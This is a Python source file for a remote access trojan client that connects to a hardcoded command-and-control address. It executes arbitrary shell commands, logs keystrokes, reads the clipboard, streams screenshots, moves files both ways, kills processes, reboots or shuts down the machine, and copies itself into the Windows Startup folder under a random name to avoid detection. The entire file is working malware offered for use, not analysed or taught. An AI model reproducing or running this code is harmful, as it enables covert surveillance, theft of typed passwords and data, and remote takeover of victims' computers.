import socket
import os
import subprocess
import pyautogui
import time
import shutil
import ctypes
import platform
import getpass
import clipboard
from pynput import keyboard
import random
import string

# Global variable to store key logs
key_logs = []
key_logging = False

def generate_random_name():
    """Generate a random file name to avoid detection."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def send_screenshare(client_socket):
    """Capture and send screen to the C2 server."""
    try:
        while True:
            screenshot = pyautogui.screenshot()
            screenshot_bytes = screenshot.tobytes()
            client_socket.sendall(screenshot_bytes)
            time.sleep(0.1)  # Adjust frame rate if needed
    except Exception as e:
        print(f"[!] Error during screenshare: {e}")

def enable_persistence():
    """Enable persistence on the target system."""
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_name = generate_random_name() + ".exe"  # Random file name for the persistence script
    script_path = os.path.abspath(__file__)
    
    if not os.path.exists(startup_path):
        os.makedirs(startup_path)
    
    # Copy script to a random file name in the Startup folder
    shutil.copy(script_path, os.path.join(startup_path, script_name))
    return "Persistence enabled."

def execute_command(command):
    """Execute a shell command."""
    try:
        result = subprocess.getoutput(command)
        return result
    except Exception as e:
        return f"Error executing command: {e}"

def reboot_system():
    """Reboot the target system."""
    try:
        if os.name == 'nt':
            subprocess.call(["shutdown", "/r", "/t", "0"])
        else:
            subprocess.call(["sudo", "reboot"])
    except Exception as e:
        return f"Error rebooting system: {e}"

def shutdown_system():
    """Shut down the target system."""
    try:
        if os.name == 'nt':
            subprocess.call(["shutdown", "/s", "/t", "0"])
        else:
            subprocess.call(["sudo", "shutdown", "now"])
    except Exception as e:
        return f"Error shutting down system: {e}"

def get_pc_info():
    """Retrieve system information."""
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Hostname": socket.gethostname()
    }
    return "\n".join(f"{key}: {value}" for key, value in info.items())

def get_user_info():
    """Retrieve current user and domain information."""
    user = getpass.getuser()
    domain = os.getenv("USERDOMAIN", "N/A")  # Domain might not always be available
    return f"User: {user}\nDomain: {domain}"

def get_clipboard_content():
    """Retrieve clipboard content."""
    try:
        content = clipboard.paste()
        return f"Clipboard Content: {content}"
    except Exception as e:
        return f"Error accessing clipboard: {e}"

def start_keylogger():
    """Start key logging."""
    global key_logging, key_logs
    key_logging = True
    key_logs = []

    def on_press(key):
        global key_logs, key_logging
        if not key_logging:
            return False  # Stop the listener
        try:
            if key == keyboard.Key.enter:
                key_logs.append("[ENTER]")
            elif hasattr(key, 'char') and key.char:  # Only capture printable characters
                key_logs.append(key.char)
        except AttributeError:
            pass

    # Start listener in a separate thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    """Stop key logging."""
    global key_logging
    key_logging = False

def dump_keylogs():
    """Dump logged keys."""
    global key_logs
    return "".join(key_logs)

# Main client loop
def client_loop(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print(f"[*] Connected to C2 server at {server_ip}:{server_port}")

    while True:
        try:
            command = client.recv(4096).decode()
            if command.lower() == "exit":
                print("[*] Exiting...")
                client.close()
                break
            elif command.lower() == "screenshare":
                send_screenshare(client)
            elif command.lower().startswith("upload"):
                _, file_path, *dest = command.split()
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        client.send(f.read())
            elif command.lower().startswith("download"):
                _, file_path = command.split()
                with open(file_path, 'wb') as f:
                    f.write(client.recv(4096))
            elif command.lower().startswith("kill"):
                _, pid = command.split()
                os.kill(int(pid), 9)
            elif command.lower() == "ps":
                processes = subprocess.getoutput("tasklist" if os.name == "nt" else "ps aux")
                client.send(processes.encode())
            elif command.lower().startswith("run"):
                _, file_path = command.split()
                subprocess.Popen(file_path, shell=True)
            elif command.lower().startswith("shell"):
                _, *dest = command.split()
                os.chdir(dest[0] if dest else os.getcwd())
                client.send(b"Shell started.")
            elif command.lower() == "persist":
                client.send(enable_persistence().encode())
            elif command.lower() == "reboot":
                reboot_system()
            elif command.lower() == "shutdown":
                shutdown_system()
            elif command.lower() == "pcinfo":
                client.send(get_pc_info().encode())
            elif command.lower() == "identify":
                client.send(get_user_info().encode())
            elif command.lower() == "clipboard":
                client.send(get_clipboard_content().encode())
            elif command.lower() == "keymon set on":
                start_keylogger()
                client.send(b"Keylogger started.")
            elif command.lower() == "keymon set off":
                stop_keylogger()
                client.send(b"Keylogger stopped.")
            elif command.lower() == "keymon dump":
                client.send(dump_keylogs().encode())
            elif command.lower() == "help":
                help_text = """
Available Commands:
- upload <filename> -d <destination>: Upload a file to the client.
- download <filename>: Download a file from the client.
- kill <pid>: Kill a process by its PID.
- ps: List all processes.
- run <filename>: Execute a file on the client.
- shell [-d <path>]: Start a shell session; optionally specify a path.
- persist: Enable persistence on the client system.
- reboot: Reboot the client system.
- shutdown: Shut down the client system.
- screenshare: Start a live screen-sharing session.
- pcinfo: Get system information.
- identify: Get current user and domain.
- clipboard: View clipboard content.
- keymon set on: Start keylogger monitoring.
- keymon set off: Stop keylogger monitoring.
- keymon dump: Dump key logs.
- help: Show this help text.
"""
                client.send(help_text.encode())
            else:
                result = execute_command(command)
                client.send(result.encode())
        except Exception as e:
            print(f"[!] Error: {e}")
            client.close()
            break

if __name__ == "__main__":
    SERVER_IP = "10.0.1.37"
    SERVER_PORT = 9999
    client_loop(SERVER_IP, SERVER_PORT)
